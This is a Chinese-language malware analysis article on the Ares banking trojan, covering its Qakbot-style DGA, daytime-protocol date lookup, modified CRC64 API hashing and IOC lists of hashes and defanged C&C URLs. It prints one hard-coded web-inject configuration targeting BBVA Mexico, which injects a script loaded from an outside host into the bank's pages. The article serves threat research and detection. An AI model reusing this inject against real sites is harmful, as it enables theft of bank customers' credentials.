Ares 银行木马在 2021 年 2 月出现，研究人员一直在跟踪该恶意软件的发展。Ares 基于 Osiris 恶意软件家族而来，后者也是由 Kronos
银行木马衍生而来。2022 年 3 月到 2022 年 8 月，Ares 一直都处于静默期。但是 2022 年 8 月 Ares 又重出江湖，并且新增了与
Qakbot 银行木马类似的 DGA 算法。

## 技术分析

Ares 样本包含一个或多个硬编码 URL，用于 C&C 通信。在新版本的 Ares 中，会尝试请求 C&C 服务器达 50 次。如果无法联通，就启用
DGA 域名。Ares DGA 和 Qakbot DGA 之间的代码对比如下所示：

![image.png-247.1kB](https://image.3001.net/images/20220910/1662824407_631cafd799b0612cc92bb.png!small)代码对比

Ares DGA 和 Qakbot DGA 之间的主要区别在于前者每次生成 50 个域名，而旧的 Qakbot 算法每次生成 5000 个域名。Ares
通过 TCP 端口 13 使用 daytime 协议通过以下服务器检索当前日期：

> time-a.nist.gov
>
> time-a-g.nist.gov
>
> time.nist.gov

NIST 服务器的响应为 `59820 22-08-29 23:18:13 50 0 0 593.0 UTC(NIST) *`。

Ares 的 DGA 算法会生成一个长度在 8 到 25 个字符间的域名，并且在 com、net、org、info、biz、org
中选择一个作为顶级域名。Ares 的 DGA 算法每月产生 150 个域名，Ares 在 2022 年 8 月 29 日生成的域名如下所示：

![image.png-81kB](https://image.3001.net/images/20220910/1662824408_631cafd8646ce7a8c5384.png!small)2022
年 8 月 29 日的 DGA 域

目前这些域名都没有解析记录。

对 Ares 代码的分析表明，该算法很可能被重新实现，而不是继续使用 Qakbot 的 DGA 代码。攻击者很可能是基于 Qakbot
的[开源实现](https://github.com/Dan611/QakBot-DGA/blob/master/qakbot_dga.c)进行定制化修改的，二者存在诸多相似之处。

研究人员提供了生成 Ares DGA 域名的 Python 脚本，也在
[GitHub](https://github.com/threatlabz/tools/tree/main/ares)中存储。

## Web 注入配置

攻击者正在测试 Web 注入，将 HTML 内容与 JavaScript 代码插入目标网站。当前 Ares 的 C&C 服务器并不提供动态 Web
注入配置，但样本中包含了硬编码的、以 BBVA Mexico 为目标的配置：

    
    
    set_url http*bbva*.mx* GPdata_before<body*>data_enddata_inject<div id="botid" style="display:none;">%BOTID%</div><script type="text/javascript" src="https://www.trendybaby.co[.]uk/assets/css/homeats.js"></script>data_end

## 动态 API 哈希算法

Ares 的开发人员修改了 Kronos 的原始代码，通过 Windows API 哈希值以动态解析 NTDLL 函数。尽管对 CRC64
算法的修改非常小，但已经能够绕过此前检测 Kronos 的静态签名。

![image.png-103kB](https://image.3001.net/images/20220910/1662824409_631cafd908f68ac3838c0.png!small)动态
API 哈希算法

例如，字符串 sprintf 的标准 CRC64 哈希值为 `5FE79276722143D0`，而在 Ares 中的 CRC64 哈希值为
`DC1FC2878FEE79C0`。Ares 然后利用 Kronos 算法将这些值进行映射，研究人员实现了 [Python
脚本](https://github.com/threatlabz/tools/tree/main/ares)来进行映射。

## 总结

Ares 的开发人员持续为恶意软件增加新功能，最近又新增了 Qakbot 的 DGA 算法。这为攻击者提供了更好的韧性，便于获取整个网络的控制权。

## IOC

> 7498e37c332d55c14247ae4b675e726336a8683900d8fd1da412905567d2de4a  
> e5d624b7060c0e885abe11a0973a43a355c9930fc6912ff5eac83d1a9eec9c29  
> 035793d479c4229693fc6dcceaa639cd51ae89334b43e552b9c47a6dea68ce30  
> 94b084ea925990742f4eaaada1eef9a42c13066bf4f4c7a3b12a1509e32ff9e6  
> 09897c6ef88b9e9bc20917a2b47ec86ff2b727a2923678f5e2df6bb6437d3312  
> 956ae36f40d0d847daa00d7964906e7e9d1671d0f3f2e7d257d5a8d324388c31  
> 6c5dac9043b2f112543f3eca6503d4bcc70d762b47d75dcb85f9767c603de56f  
> b3348405cd0fa66661b46bc6cbab97b55708be26a2ed7a745e1632b46d1b3f41  
> baae5bbaf2decf7af9b22c4d10f66c7c77c9ebc7b73476f7cbe449d2bba97ed9  
> 31ed2ee200da9a35ab3868b3d2977e6b18bc49772d39c27d57a53b49b6e6fa4a  
> http://vbyrduc537l5po3w[.]onion/panel/connect.php  
> http://wifoweijijfoiwjweoi[.]xyz/panel/connect.php  
> http://ddkiiqefmiir[.]xyz/panel/connect.php  
> http://ddkiilefmjim[.]xyz/panel/connect.php  
> http://ddkiieeelkif[.]xyz/panel/connect.php  
> http://ddkiiofelkkq[.]xyz/panel/connect.php  
> http://ddkiihfelikh[.]xyz/panel/connect.php  
> http://ddkiiffdkijh[.]xyz/panel/connect.php  
> http://ddkiigedliji[.]xyz/panel/connect.php  
> http://ddkiirfdmjks[.]xyz/panel/connect.php  
> http://ddkiitefkkju[.]xyz/panel/connect.php  
> http://mydynamite.dynv6[.]net/panel/connect.php  
> http://cabletv[.]top/panel/connect.php  
> https://tomolina[.]top/panel/connect.php

## 参考来源

> [Zscaler](https://www.zscaler.com/blogs/security-research/ares-banking-> trojan-learns-old-tricks-adds-defunct-qakbot-dga)

